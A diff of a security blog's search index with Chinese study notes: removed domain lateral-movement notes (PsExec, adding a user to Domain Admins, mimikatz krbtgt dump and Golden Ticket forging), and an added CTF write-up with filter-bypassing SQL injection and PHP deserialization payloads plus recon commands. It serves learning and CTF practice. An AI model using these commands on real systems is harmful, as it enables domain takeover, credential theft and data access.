+<li>(结合脚本，进行批量) </li>
+<li>能够快速发现目标网站的一些服务</li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net share   显示所有共享资源</span><br><span class="line"></span><br><span class="line">net use \\ip\ipc$ &quot;密码&quot; &#x2F;user:&quot;用户名&quot; 建立ipc非空连接</span><br><span class="line"></span><br><span class="line">net use h: \\ip\c$     将对方c 映射到本地h</span><br><span class="line"></span><br><span class="line">net use \\ip\c$ &#x2F;del   如果断开连接就删除重新连接就行</span><br></pre></td></tr></table></figure>
-
-
-
-<span id="more"></span>
-
-
-
-<h3 id="psexec-ipc"><a href="#psexec-ipc" class="headerlink" title="psexec+ipc$"></a>psexec+ipc$</h3><p>前提是与目标主机建立ipc连接</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\192.168.3.100\ipc$   建立ipc共享</span><br><span class="line"></span><br><span class="line">PsExec64.exe -accepteula \\&lt;目标机IP&gt; -s cmd.exe   #获得交互式shell，并且权限提升到system权限</span><br><span class="line"></span><br><span class="line">net group &#x2F;domain</span><br><span class="line"></span><br><span class="line">net user hack 123qwe... &#x2F;add &#x2F;domain   #创建普通域用户</span><br><span class="line"></span><br><span class="line">net group &quot;Domain Admins&quot; hack &#x2F;add &#x2F;domain   #将普通域用户 提升为域管理</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="ipc-at"><a href="#ipc-at" class="headerlink" title="ipc+at"></a>ipc+at</h3><h3 id="ipc-schtasks"><a href="#ipc-schtasks" class="headerlink" title="ipc+schtasks"></a>ipc+schtasks</h3><h1 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h1><h1 id="winrm服务"><a href="#winrm服务" class="headerlink" title="winrm服务"></a>winrm服务</h1><h1 id="dcom"><a href="#dcom" class="headerlink" title="dcom"></a>dcom</h1><h1 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h1><h1 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h1><p>通常用来域内权限维持</p>
-<h3 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h3><p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220307225058167.png" alt="image-20220307225058167"></p>
-<p>krbtgt 是kdc服务使用账户，在Domain Admins组中，域环境中，用户账户的票据都是krbtgt生成的。</p>
-<p>如果攻击者拿到了 krbtgt的ntml hash或者AES-256值，<code>即可伪造任意用户身份</code></p>
-<p>需要条件：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 需要伪造的域用户名（有域管，肯定伪造域管啦）</span><br><span class="line"></span><br><span class="line">2. 该域的域名</span><br><span class="line"></span><br><span class="line">3. krbtgt的ntml hash或者AES-256值</span><br><span class="line"></span><br><span class="line">4. 域krbtgt  SID (去掉-502)     （wmic useraccount get name,sid）</span><br></pre></td></tr></table></figure>
-
-<p>获得krbtgt账号的SID值和ntml hash哈希值     [这个需要我们用域账户（权限太低不行，即域管权限），并且将该用户加入本地管理员组，或者用域管理员方式进行cmd命令执行]</p>
-<ol>
-<li>获得hash等需要的条件信息</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync &#x2F;domain:shmily.god &#x2F;user:krbtgt&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220307225230207.png" alt="image-20220307225230207"></p>
-<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220307225631024.png" alt="image-20220307225631024"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SID        :S-1-5-21-2538459943-234226500-22795540782</span><br><span class="line">ntml hash  :8aecb1498df128a866968668302003bd</span><br><span class="line">aes256     :1f15a3cce65909ed19ff0e5ec6b7102f630be3725b12c66e25251ab0b81305e7 </span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li>查询域管理员账号：</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &quot;domain admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308000619676.png" alt="image-20220308000619676"></p>
-<p>注入票据前</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir \\192.168.119.200\c$</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308004612176.png" alt="image-20220308004612176"></p>
-<ol start="3">
-<li>清空会话票据</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308001049876.png" alt="image-20220308001049876"></p>
-<ol start="4">
-<li>生成黄金票据(Administrator.kiribi)</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::golden &#x2F;user:administrator &#x2F;domain:shmily.god &#x2F;sid:S-1-5-21-2538459943-234226500-22795540782 &#x2F;krbtgt:8aecb1498df128a866968668302003bd &#x2F;ticket:Administrator.kiribi</span><br><span class="line"></span><br><span class="line"># kerberos::golden &#x2F;user:要伪造的域用户(我们这一般写域管理员) &#x2F;domain:域名 &#x2F;sid:域的sid值 &#x2F;krbtgt:krbtgt的哈希 &#x2F;ptt</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308002554785.png" alt="image-20220308002554785"></p>
-<ol start="5">
-<li>注入票据</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::ptt Administrator.kiribi</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308002722245.png" alt="image-20220308002722245"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::tgt  查看当前票据</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308002904106.png" alt="image-20220308002904106"></p>
-<ol start="6">
-<li>验证</li>
-</ol>
-<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308003825467.png" alt="image-20220308003825467"></p>
-<p>使用黄金票据伪造的用户可以是任意用户（即使这个用户不存在），因为 TGT 的加密是由 krbtgt 完成的，所以只要 TGT 被 krbtgt 账户和密码正确的加密，那么任意 KDC 使用 krbtgt 将 TGT 解密后，TGT 中的所有信息都是可信的。</p>
-<h3 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h3><p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220307220404812.png" alt="image-20220307220404812"></p>
-<p>参考：渗透攻击红队公众号</p>
-<p><a href="https://cloud.tencent.com/developer/article/1653877">内网渗透（四） | 票据传递攻击 - 云+社区 - 腾讯云 (tencent.com)</a></p>
+<p>参考：</p>
+<p><a href="https://github.com/Qftm/Information_Collection_Handbook">https://github.com/Qftm/Information_Collection_Handbook</a></p>
 ]]></content>
       <categories>
-        <category>内网</category>
+        <category>渗透</category>
       </categories>
       <tags>
-        <tag>内网横向渗透</tag>
+        <tag>信息收集</tag>
       </tags>
   </entry>
   <entry>
-    <title>内网知识学习</title>
-    <url>/2022/01/23/%E5%86%85%E7%BD%91%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<p>[toc]</p>
-<h1 id="ntlm协议"><a href="#ntlm协议" class="headerlink" title="ntlm协议"></a>ntlm协议</h1><p><a href="https://www.istt.org.cn/NewsDetail/2031875.html">Windows认证原理 网络认证(进阶篇)-江苏智慧安全可信技术研究院 (istt.org.cn)</a></p>
-<h1 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h1><p>Kerberos是一种由MIT提出的一种计算机网络授权协议，旨在通过使用加密技术为客户端/服务端应用程序提供强大的认证服务。</p>
-<p>Kerberos 主要是用在<code>域环境下的身份认证协议</code>。</p>
-<p><img src="/2022/01/23/%E5%86%85%E7%BD%91%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/image-20220124122003434.png" alt="image-20220124122003434"></p>
-<p>client              ——       TGT            ——               <strong>KDC</strong>，密钥分发中心(<strong>AS</strong>，身份验证服务,<strong>TGS</strong>，票据授权服务)</p>
-<p>|</p>
-<p>TGS(ticket )</p>
-<p>|</p>
-<p>server </p>
+    <title>MARDASCTF2021</title>
+    <url>/2021/05/02/MARDASCTF2021/</url>
+    <content><![CDATA[<h2 id="BestDB-sql注入类型"><a href="#BestDB-sql注入类型" class="headerlink" title="BestDB -sql注入类型"></a>BestDB -sql注入类型</h2><p><img src="/2021/05/02/MARDASCTF2021/1.png" alt="1"></p>
+<p>一看就感觉存在sql注入，重点是如何闭合，绕过。</p>
+<span id="more"></span>
+
+<p>F12 发现      <code>$sql = &quot;SELECT * FROM users WHERE id = &#39;$query&#39; OR username = \&quot;$query\&quot;&quot;;</code></p>
+<p>刚开始没有注意到 <code>OR username = \&quot;$query\&quot;&quot;;</code> giao ,一直在通过进行注入，但是都  Forbidden!!!了，过滤了单引号</p>
+<p>然后尝试输入username尝试，当$query值为lisi时候我们进行闭合会有回显，而且只有个简单的空格过滤，/**/绕过即可。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lisi&quot;&#x2F;**&#x2F;and&#x2F;**&#x2F;1&#x3D;1# 回显正常</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;and&#x2F;**&#x2F;1&#x3D;2# 报错</span><br><span class="line">说明存在注入。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lisi&quot;&#x2F;**&#x2F;order&#x2F;**&#x2F;by&#x2F;**&#x2F;3#  回显正常</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;order&#x2F;**&#x2F;by&#x2F;**&#x2F;4#  不回显。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查数据库名</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;(select&#x2F;**&#x2F;group_concat(schema_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.schemata)2,3# </span><br><span class="line">可有可无这</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/02/MARDASCTF2021/2.png" alt="2"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查表名</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),2,3#   </span><br><span class="line"></span><br><span class="line">过滤了单引号&#39;dataabse()&#39;就不能使用,</span><br><span class="line">正常在数据库查询，表名需带反引号，在php端中并不需要</span><br><span class="line"></span><br><span class="line">f1agdas,users两个表</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查字段名</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;(select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&quot;f1agdas&quot;),2,3# </span><br><span class="line"></span><br><span class="line">&quot;f1agdas&quot;记得双引号</span><br><span class="line"></span><br><span class="line">id,f1agdas</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查数据</span><br><span class="line"></span><br><span class="line">lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;(select&#x2F;**&#x2F;f1agdas&#x2F;**&#x2F;from&#x2F;**&#x2F;f1agdas),2,3#</span><br><span class="line"></span><br><span class="line">flag.txt</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">读文件</span><br><span class="line">lisi&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;(select&#x2F;**&#x2F;load_file(0x2f666c61672e747874)),2,3#</span><br><span class="line"></span><br><span class="line">&#x2F;flag.txt进行十六进制或者CHAR()是为了绕过对&quot;&#x2F;&quot;过滤</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/02/MARDASCTF2021/3.png" alt="3"></p>
+<h2 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h2><p>先贴上源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;B&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;ctfer&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> C;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;bad hacker~&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line">&#125; hello ctfer</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.anquanke.com/post/id/167140#h2-5">https://www.anquanke.com/post/id/167140#h2-5</a></p>
+<p>以前没有见过，这里存在动态拼接类，我们需要原生类进行去读文件。</p>
+<p>一.可遍历目录类</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DirectoryIteratorFilesystemIterator</span><br></pre></td></tr></table></figure>
+
+<p><code>GlobIterator</code> 与上面略不同，该类可以通过模式匹配来寻找文件路径。</p>
+<p>二.可读取文件类</p>
+<p><code>SplFileObject</code> 在此函数中，URL 可作为文件名，不过也要受到<code>allow_url_fopen</code>影响</p>
+<p>参考<a href="http://www.plasf.cn/articles/dasctf202103.html">http://www.plasf.cn/articles/dasctf202103.html</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?phpclass A&#123;    public $class &#x3D; &#39;FilesystemIterator&#39;;    public $para &#x3D;&quot;&#x2F;var&#x2F;www&#x2F;html&quot;;    public $check ;&#125;$pop&#x3D;new A();$pop&#x3D;serialize($pop);var_dump($pop);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/02/MARDASCTF2021/4.png" alt="4"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?phpclass A&#123;    public $class&#x3D;&#39;SplFileObject&#39;;    public $para&#x3D;&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE&#x2F;flag.php&quot;;    public $check;    &#125;$o  &#x3D; new A();echo serialize($o);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/02/MARDASCTF2021/5.png" alt="5"></p>
+<hr>
+<p>利用原生类来反序列化，题目我第一次见，参考了网上的博客，</p>
+<p>因为php原生类有很多的特定功能。</p>
+<hr>
+<p><a href="https://shimo.im/docs/V1hLlJ0RoRkI7Si9/">https://shimo.im/docs/V1hLlJ0RoRkI7Si9/</a>  各位大佬wp</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>MARDASCTF2021</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网信息收集</title>
+    <url>/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
+    <content><![CDATA[<h2 id="windows信息收集"><a href="#windows信息收集" class="headerlink" title="windows信息收集"></a>windows信息收集</h2><h4 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line"></span><br><span class="line">ipconfig &#x2F;all  #是否在域内，网卡信息等</span><br><span class="line"></span><br><span class="line">systeminfo  #查看主机信息，os名称，版本，域，补丁</span><br><span class="line">（要提取的话根据补丁，寻找https:&#x2F;&#x2F;i.hacking8.com&#x2F;tiquan）</span><br><span class="line"></span><br><span class="line">net user       #本机用户列表</span><br><span class="line">net localgroup administrators  #本地管理员</span><br><span class="line"></span><br><span class="line">wmic product get name,version   #查看安装软件版本</span><br><span class="line">powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,Version&quot;          #查看安装软件版本</span><br><span class="line"></span><br><span class="line">tasklist       # 默认显示映像名称，PID，会话名，会话，内存使用</span><br><span class="line">tasklist &#x2F;svc  # 显示PID，服务  </span><br><span class="line">（查看是否有杀软 https:&#x2F;&#x2F;www.ddosi.com&#x2F;av&#x2F;1.php）</span><br><span class="line"></span><br><span class="line">netstat -nao               #查看端口</span><br><span class="line">netstat -an | find “3389”  #查看对应端口</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I|findstr “TTL&#x3D;”</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p>ipconfig /all</p>
+<img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621092728.png" alt="image-20210621092721554" style="zoom:150%;">
+
+
+
+<p>net  user</p>
+<p>net localgroup administrators </p>
+<img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621095850.png" alt="20210621095850" style="zoom:150%;">
+
+<p>wmic product get name,version </p>
+<img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621100332.png" alt="20210621100332">
+
+<p>powershell “Get-WmiObject -class Win32_Product | Select-Object -Property name,Version” </p>
+<img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621100357.png" alt="20210621100357">
+
+
+
+<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621101825.png" alt="20210621101825"></p>
+<img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621112046.png" alt="20210621112046" style="zoom:150%;">
+
+
+
+
+
+
+
+
+
+
+
+<h4 id="域的信息收集"><a href="#域的信息收集" class="headerlink" title="域的信息收集"></a>域的信息收集</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user &#x2F;domain           #查询域用户 (通过samr，利用的RPC接口)</span><br><span class="line">net view                   #查看域信息</span><br><span class="line">net view &#x2F;domain           #查看主域信息</span><br><span class="line">net accounts &#x2F;domain       #获取与密码信息(策略)</span><br><span class="line"></span><br><span class="line">net group &#x2F;domain                            #查询域内组</span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain         #查看域内所有的主机名</span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain       #查看域控</span><br><span class="line">net group &quot;domain admins&quot;   &#x2F;domain          #查看域管理员</span><br><span class="line">net group &quot;enterpriser admins&quot;   &#x2F;domain     #查看企业管理用户</span><br><span class="line">net config workstation      #主机名，主机版本，工作站域，工作站域dns-name,当前登录域</span><br><span class="line"></span><br><span class="line">nslookup god.org            #可以定位域控</span><br><span class="line"></span><br><span class="line">net share                   #查看本地共享资源</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621103820.png" alt="20210621103820"></p>
+<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621104756.png" alt="20210621104756"></p>
+<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621104813.png" alt="20210621104813"></p>
+<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621104834.png" alt="20210621104834"></p>
+<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621105024.png" alt="20210621105024"></p>
+<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621111006.png" alt="20210621111006"></p>
+<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621112521.png" alt="20210621112521"></p>
+<p>查询域内的SPN。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前域内所有的SPN：setspn  -Q  *&#x2F;*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看指定域xie.com注册的SPN：setspn -T xxxxx.god -Q *&#x2F;*      如果指定域不存在，则默认切换到查找本域的SPN</span><br><span class="line"></span><br><span class="line">setspn -L username</span><br><span class="line">setspn -L hostname   查询用户  或者主机名注册的spn</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220303175201822.png" alt="image-20220303175201822"></p>
+<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220303175812371.png" alt="image-20220303175812371"></p>
 <p>参考：</p>
-<p><a href="https://mp.weixin.qq.com/s/MWN5darSef0OqiT6rLk9nA">https://mp.weixin.qq.com/s/MWN5darSef0OqiT6rLk9nA</a></p>
-<p><a href="https://mp.weixin.qq.com/s/5u2dyu1wVji8d1IxLb11DA">https://mp.weixin.qq.com/s/5u2dyu1wVji8d1IxLb11DA</a></p>
-<p><a href="https://www.istt.org.cn/NewsDetail/2031879.html">Windows认证原理 Kerberos认证-江苏智慧安全可信技术研究院 (istt.org.cn)</a></p>
-<p>​    </p>
-<h1 id><a href="#" class="headerlink" title></a></h1><h3 id="解密浏览器密码工具"><a href="#解密浏览器密码工具" class="headerlink" title="解密浏览器密码工具"></a>解密浏览器密码工具</h3><p>（有杀软）本地解chrome数据库方法：<a href="https://github.com/moonD4rk/HackBrowserData/releases/tag/v0.3.7">https://github.com/moonD4rk/HackBrowserData/releases/tag/v0.3.7</a> </p>
-<p>（无杀软） 直接用<a href="https://github.com/moonD4rk/HackBrowserData">hack-browser-data.exe</a>导出cookie</p>
-<p>参考：</p>
-<p>dozerctf2021域渗透：<a href="https://www.yuque.com/w0rkmn/lnpppa/mdie6g#f755069b">https://www.yuque.com/w0rkmn/lnpppa/mdie6g#f755069b</a></p>
+<p><a href="https://www.t00ls.net/articles-39285.html">内网渗透命令大全</a></p>
+<p><a href="https://jwt1399.top/posts/25535.html#toc-heading-14">Attck1</a></p>
+<p><a href="https://mp.weixin.qq.com/s/aXEJpZVxxSkFUfG8TqsxHw">内网渗透学习导航</a></p>
+<p><a href="https://mp.weixin.qq.com/s/l6AajnxFp8GMIYqVcN4SGg">参考1</a></p>
+<p>命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user hack 123qwe... &#x2F;add &#x2F;domain   #创建普通域用户</span><br><span class="line"></span><br><span class="line">net group &quot;Domain Admins&quot; hack &#x2F;add &#x2F;domain   #将普通域用户 提升为域管理</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>内网</category>
       </categories>
       <tags>
-        <tag>内网知识学习</tag>
+        <tag>内网信息收集</tag>
       </tags>
   </entry>
   <entry>
@@ -1287,6 +1487,63 @@
       </tags>
   </entry>
   <entry>
+    <title>基础web漏洞总结</title>
+    <url>/2022/03/14/%E5%9F%BA%E7%A1%80web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h1 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h1><h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><ol>
+<li>判断前后端校验</li>
+<li>判断黑白名单（可以上传1.xxxxx 测试）</li>
+</ol>
+<h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><h5 id="利用文件包含"><a href="#利用文件包含" class="headerlink" title="利用文件包含"></a>利用文件包含</h5><ul>
+<li><p>图片马</p>
+</li>
+<li><p>包含session文件</p>
+</li>
+</ul>
+<h5 id><a href="#" class="headerlink" title></a></h5><h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><h5 id="后缀绕过"><a href="#后缀绕过" class="headerlink" title="后缀绕过"></a>后缀绕过</h5><h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><p>参考：</p>
+<p><a href="https://xz.aliyun.com/t/10459">https://xz.aliyun.com/t/10459</a></p>
+<p><a href="https://xz.aliyun.com/t/10515">https://xz.aliyun.com/t/10515</a></p>
+<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><ul>
+<li>条件竞争</li>
+</ul>
+<hr>
